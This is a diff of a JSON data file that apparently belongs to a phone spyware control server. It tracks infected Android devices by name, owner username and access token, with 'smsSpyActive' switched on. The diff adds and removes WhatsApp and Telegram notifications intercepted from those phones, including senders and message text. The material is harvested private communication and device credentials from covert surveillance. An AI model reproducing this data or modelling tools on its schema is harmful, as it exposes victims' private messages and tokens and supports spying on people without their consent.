@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776780030396,
+    "lastSeen": 1776780036067,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3585 pesan dari 20 chat",
+        "time": "21/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780033051
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (10 pesan): yudd",
@@ -10320,14 +10328,6 @@
         "time": "21/04 20:30",
         "pkg": "com.whatsapp",
         "receivedAt": 1776778217147
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB JB APK BUG BY ZIDE × KYY😈 (4 pesan): ~ DANZ STORE",
-        "content": "💟 Stiker",
-        "time": "21/04 20:30",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778216797
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780032026,
+    "lastSeen": 1776780035936,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 21:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776780037667
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14394,14 +14402,6 @@
         "time": "21/04 20:29",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778191801
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "Fs Noktel \nId 1 r9k nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
-        "time": "21/04 20:29",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778191589
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776780032966,
+    "lastSeen": 1776780036207,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
